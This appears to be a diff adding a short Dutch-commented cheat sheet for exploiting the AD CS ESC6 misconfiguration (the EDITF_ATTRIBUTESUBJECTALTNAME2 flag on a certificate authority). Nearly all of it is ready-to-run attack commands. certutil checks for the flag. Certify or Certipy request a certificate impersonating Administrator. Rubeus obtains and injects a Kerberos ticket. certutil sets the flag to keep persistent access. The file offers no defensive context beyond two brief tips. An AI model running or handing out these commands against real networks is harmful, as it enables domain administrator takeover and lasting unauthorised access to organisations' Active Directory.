@@ -1,0 +1,16 @@
+# AD CS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 flag op CA
+# Als deze flag actief is op de CA, kan ELKE template misbruikt worden voor ESC1-achtige aanval
+# De aanvrager kan altijd een SAN specificeren, ongeacht template configuratie
+# Stap 1: Check of de flag actief is
+certutil -config "dc01.domain.local\domain-CA" -getreg "policy\EditFlags"
+# Zoek naar: EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
+# Stap 2: Certificaat aanvragen met SAN (elke template werkt)
+.\Certify.exe request /ca:dc01.domain.local\domain-CA /template:"User" /altname:Administrator
+# Of met Certipy:
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template User -upn Administrator@domain.local
+# Stap 3: TGT aanvragen met certificaat
+.\Rubeus.exe asktgt /user:Administrator /certificate:esc6.pfx /password:Password123! /ptt
+# Stap 4: Als CA admin - flag zelf activeren (voor persistence)
+certutil -config "dc01.domain.local\domain-CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+# Tip: ESC6 is een CA-level misconfig, niet template-level
+# Tip: Alle templates worden kwetsbaar als deze flag actief is
